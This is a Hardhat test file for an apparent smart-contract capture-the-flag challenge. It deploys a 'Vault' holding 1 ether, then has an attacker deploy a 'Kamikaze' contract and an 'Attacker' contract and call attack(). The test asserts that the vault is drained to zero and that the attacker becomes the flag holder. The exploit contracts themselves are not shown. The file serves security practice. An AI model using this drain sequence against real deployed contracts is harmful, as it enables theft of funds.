const { expect } = require("chai");
const { ethers } = require("hardhat");

const { provider, utils } = ethers;

describe("Vault contract", function () {
  let vault;
  let deployer;
  let attacker;
  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory("Vault");
    vault = await Vault.deploy({ value: ethers.utils.parseEther("1") });
  });

  it("attack", async () => {
    const vaultBalance = await provider.getBalance(vault.address);
    expect(vaultBalance.eq(utils.parseEther("1"))).to.equal(true);

    const KamikazeFactory = await ethers.getContractFactory("Kamikaze");
    const kamikaze = await KamikazeFactory.connect(attacker).deploy(
      vault.address,
      {
        value: utils.parseEther("1"),
      }
    );
    await kamikaze.deployed();

    const AttackerFactory = await ethers.getContractFactory("Attacker");
    const attackerContract = await AttackerFactory.connect(attacker).deploy(
      vault.address
    );
    await attackerContract.deployed();

    const tx = await attackerContract.connect(attacker).attack({
      value: utils.parseEther("2"),
    });
    await tx.wait();

    expect(await provider.getBalance(vault.address)).to.equal(0);
    expect(await vault.flagHolder()).to.equal(attacker.address);
  });
});
